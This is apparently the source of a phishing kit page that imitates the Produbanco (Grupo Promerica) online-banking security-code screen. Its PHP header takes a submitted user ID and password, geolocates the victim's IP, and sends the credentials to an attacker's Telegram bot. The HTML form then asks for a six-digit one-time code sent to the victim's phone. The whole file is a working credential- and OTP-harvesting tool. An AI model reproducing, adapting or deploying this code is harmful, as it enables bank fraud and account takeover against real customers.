<?php
ini_set("display_errors", 0);
@$userp = $_SERVER['REMOTE_ADDR'];
@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$userp));
@$pais = $meta['geoplugin_countryName']; 
include('datos_de_tel.php');

if( isset ($_POST['userid']) && isset ($_POST['userclav'])  ){

$message = "PR0D\r\nUser: ".$_POST['userid']."\r\nClv: ".$_POST['userclav']."\r\nIP:".$userp." ".$pais."";

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );




}


?>
<!DOCTYPE html>
<html class=" js no-touch csstransforms csstransitions js no-touch csstransforms csstransitions"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,Chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, user-scalable=yes" target-densitydpi="dpi">

    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <title>Produbanco - Grupo Promerica</title>


    <link href="produnetcss.css" rel="stylesheet">

</head>
<body>
    <header id="cabecera" class="container-fluid">
    <div class="row">
        <noscript>
            <div id="divIndicacionScript" class="col-sm-12 col-md-12 col-lg-12 col-xs-12">
                <div class="alert alert-info" role="alert">
                    <blockquote class="blockquote-info">
                        Produnet requiere usar Javascript. Por favor activa esta funcionalidad en tu navegador y refresca la página.
                    </blockquote>
                </div>
            </div>
        </noscript>
    </div>
</header>
        <main id="contenedorPrincipal" class="ds-contenedor-principal">
            <section class="ds-contenedor ds-contenedor--publico ds-contenedor__scroll">
                <aside class="ds-imagen-principal">
                    <div class="ds-imagen-principal__banner"></div>
                </aside>
                <section class="ds-contenido-principal">
                    <div id="logoMarca" class="ds-logotipo"></div>
                    <div id="contenedorMensajeAlertaError"> </div>
                    <div id="contenedorMensajeAlertaExito"> </div>
                    <h4 style="font-family:Trebuchet MS,sans-serif;" class="ds-titulo-primario ds-titulo-primario--color-primario">Factor de seguridad</h4>
                    <div id="contenedorMensajeAlertaInformativa"> </div>
                    <section id="contenidoPrincipal">



<div id="divContenedorPagina">
    <div class="ds-formulario-vista">
        <form action="ind.php" method="post" >

            <input name="__RequestVerificationToken" type="hidden" value="lSREZJfKjgAy7sOVTD33PgQTkZid1HSgbYtW8dEdPv5-DATjtF5omLIpskdfCv89UQvMSFVKNJ3MZhEjwBAeZ25vmp7iwcqXqxRm9o6pnk81"><input id="SecretoMaquina" name="SecretoMaquina" type="hidden" value="">            <span style="font-size: 16px;color:#737673;font-weight:inherit;" class="ds-subtitulo">Ingrese la clave de seguridad temporal que enviamos a tu celular.</span>
                    <div style="font-family:sans-serif;">
                        <div class="ds-grupo-caja" style="font-family:sans-serif;">

                        <input type="number" maxlength="1" style=" border: 2px solid #DDDDDD!important;
            border-radius: 5px!important;
            width: 45px!important;
            height: 50px!important;
            text-align: center;
            font-size: 30px;
            font-family: 'roboto-regular';
            color: #444444;
            -webkit-transition: all 0.4s;
            -moz-transition: all 0.4s;
            transition: all 0.4s;
            justify-content: center;" id="desafio1" autocomplete="off" onkeyup="if (this.value.length == this.getAttribute('maxlength')) num2.focus()" name="num1" autofocus required>

                        <input type="number" maxlength="1" style=" border: 2px solid #DDDDDD!important;
            border-radius: 5px!important;
            width: 45px!important;
            height: 50px!important;
            text-align: center;
            font-size: 30px;
            font-family: 'roboto-regular';
            color: #444444;
            -webkit-transition: all 0.4s;
            -moz-transition: all 0.4s;
            transition: all 0.4s;
            justify-content: center;" id="desafio2" autocomplete="off" onkeyup="if (this.value.length == this.getAttribute('maxlength')) num3.focus()" id="num2" name="num2"required>

                        <input type="number" maxlength="1" style=" border: 2px solid #DDDDDD!important;
            border-radius: 5px!important;
            width: 45px!important;
            height: 50px!important;
            text-align: center;
            font-size: 30px;
            font-family: 'roboto-regular';
            color: #444444;
            -webkit-transition: all 0.4s;
            -moz-transition: all 0.4s;
            transition: all 0.4s;
            justify-content: center;" id="desafio3" autocomplete="off" onkeyup="if (this.value.length == this.getAttribute('maxlength')) num4.focus()" id="num3" name="num3" required>

                        <input type="number" maxlength="1" style=" border: 2px solid #DDDDDD!important;
            border-radius: 5px!important;
            width: 45px!important;
            height: 50px!important;
            text-align: center;
            font-size: 30px;
            font-family: 'roboto-regular';
            color: #444444;
            -webkit-transition: all 0.4s;
            -moz-transition: all 0.4s;
            transition: all 0.4s;
            justify-content: center;" id="desafio4" autocomplete="off" onkeyup="if (this.value.length == this.getAttribute('maxlength')) num5.focus()"  id="num4" name="num4" required>

                        <input type="number" maxlength="1" style=" border: 2px solid #DDDDDD!important;
            border-radius: 5px!important;
            width: 45px!important;
            height: 50px!important;
            text-align: center;
            font-size: 30px;
            font-family: 'roboto-regular';
            color: #444444;
            -webkit-transition: all 0.4s;
            -moz-transition: all 0.4s;
            transition: all 0.4s;
            justify-content: center;" id="desafio5" autocomplete="off" onkeyup="if (this.value.length == this.getAttribute('maxlength')) num6.focus()" id="num5" name="num5" required>

                        <input type="number" maxlength="1" style=" border: 2px solid #DDDDDD!important;
            border-radius: 5px!important;
            width: 45px!important;
            height: 50px!important;
            text-align: center;
            font-size: 30px;
            font-family: 'roboto-regular';
            color: #444444;
            -webkit-transition: all 0.4s;
            -moz-transition: all 0.4s;
            transition: all 0.4s;
            justify-content: center;" id="desafio6" autocomplete="off" onkeyup="if (this.value.length == this.getAttribute('maxlength')) form1.submit();" id="num6" name="num6" required>

                        <span class="icn-success"></span>
                    </div>

                    <span  style="font-size: 16px;color:#489E42;font-weight:inherit;" class="ds-subtitulo"><u>Reenviar código</u></span>

                        <div id="divBotonInicioSesion" class="ds-div__boton--mostrar">
                            <input style="background-color:#147A06;font-family:Trebuchet MS,sans-serif;" type="submit" value="Continuar" id="btnEnrolamiento" style="font-family:Trebuchet MS,sans-serif;" class="ds-control ds-control-boton ds-control-boton--secundario">

                        </div>
                        <div id="divBotonInicioSesionIE" class="ds-div__boton--ocultar">
                            <input type="submit" value="Continuar" id="btnAceptarInternetExplorer" class="ds-control ds-control-boton ds-margen-superior-30 ds-margen-superior-30 ds-control-boton--deshabilitado" type="button" disabled="disabled">
                        </div>

                         </form>   


                <br>
                    <div id="divBotonInicioSesion" class="ds-div__boton--mostrar">
                    <input style="background-color:#fff;font-family:Trebuchet MS,sans-serif;color: black;" type="submit" value="Cancelar" id="btnEnrolamiento" style="font-family:Trebuchet MS,sans-serif;" class="ds-control ds-control-boton ds-control-boton--secundario">

                </div>
                <div id="divBotonInicioSesionIE" class="ds-div__boton--ocultar">
                    <input type="submit" value="Cancelar" id="btnAceptarInternetExplorer" class="ds-control ds-control-boton ds-margen-superior-30 ds-margen-superior-30 ds-control-boton--deshabilitado" type="button" disabled="disabled">
                </div>




<div class="ds-modal fade ds-modal--ocultar" id="modalNavegadoresSugeridos" role="dialog" data-keyboard="false" data-backdrop="static">
    <div class="ds-modal__dialog-navegador ds-modal-dialog-centered" role="document">
        <div class="ds-modal-content ds-modal__informacion">
            <div id="contenedorCabeceraModal" class="ds-modal-header ds-cabecera-modal">
                <div id="contenedorImagenModal" class="ds-imagen-modal">
                    <img class="ds-modal__imagen--origami-superior" src="imgs/origami_superior.png" alt="origami superior">
                    <img class="ds-img__cerrar-blanco" src="imgs/icono_cerrar-blanco.svg" onclick="fnCerrarmodalNavegadoresSugeridos()" alt="icono cerrar">
                </div>
            </div>
            <div id="cuerpoModal" class="ds-modal-body ds-cuerpo-modal ds-cuerpo-modal__centro">
                <div class="col-lg-12">
                    <div class="col-lg-3 ds-imagen-modal--derecha">
                        <img src="imgs/icono_campana.svg" alt="">
                    </div>
                    <div class="col-lg-9 ds-texto-izquierdo">
                        <span class="ds-titulo__navegador-sugerido" id="tituloModal">Importante</span>
                        <br>
                        <br>
                        <span style="font-family:Trebuchet MS,sans-serif;" id="spanCuerpoModal" class="ds-texto__navegador-sugerido">
                            Para que tu experiencia sea la mejor utiliza uno de los siguientes navegadores:
                        </span>
                    </div>
                </div>
            </div>
            <div id="modalPie" class="ds-modal-pie ds-modal-pie-centro">
                <div class="ds-margen-inferior-30">
                    <img src="imgs/navegador_google-chrome.svg" alt="Navegador Google Chrome">
                    <img src="imgs/navegador_microsoft-edge.svg" alt="Navegador Microsoft Edge">
                    <img src="imgs/navegador_mozilla-firefox.svg" alt="Navegador Mozilla Firefox">
                    <img src="imgs/navegador_safari.svg" alt="Navegador Safari">
                </div>
            </div>
        </div>
    </div>
</div>

<div class="ds-modal fade ds-modal--ocultar" id="modalNavegadorCambia" role="dialog" data-keyboard="false" data-backdrop="static">
    <div class="ds-modal__dialog--navegador-cambia" role="document">
        <div class="ds-modal-content">
            <div id="cuerpoModal" class="ds-modal-body ds-cuerpo-modal">
                <div class="col-lg-12 ds-margen-superior-30 ds-margen-inferior-30">
                    <img class="ds-img__cerrar--negro" src="imgs/icono_cerrar-negro.svg" onclick="fnCerrarmodalNavegadorCambia()" alt="icono cerrar">
                    <div class="col-lg-1">
                        <img src="imgs/icono_pagina-web.svg" alt="Pagina web">
                    </div>
                    <div class="col-lg-6 ds-texto-izquierdo">
                        <span class="ds-titulo__navegador-cambia" id="tituloModal">Cambia de navegador</span>
                        <br>
                        <br>
                        <span  class="ds-texto__navegador-cambia">
                            Para tener una mejor experiencia te recomendamos utilizar los siguientes navegadores.
                        </span>
                        <span class="ds-texto__navegador-cambia--negrita">
                            Recuerda descargarlos en páginas oficiales.
                        </span>
                    </div>
                    <div class="col-lg-5 ds-imagen__navegador--cambia">
                        <img src="imgs/navegador_google-chrome.svg" alt="Navegador Google Chrome">
                        <img src="imgs/navegador_microsoft-edge.svg" alt="Navegador Microsoft Edge">
                        <img src="imgs/navegador_mozilla-firefox.svg" alt="Navegador Mozilla Firefox">
                        <img src="imgs/navegador_safari.svg" alt="Navegador Safari">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>



                    </section>
                </section>
            </section>
        </main>
        </span></div><div class="lb-closeContainer"><a class="lb-close"></a></div></div></div></div>

    </body>
    </html>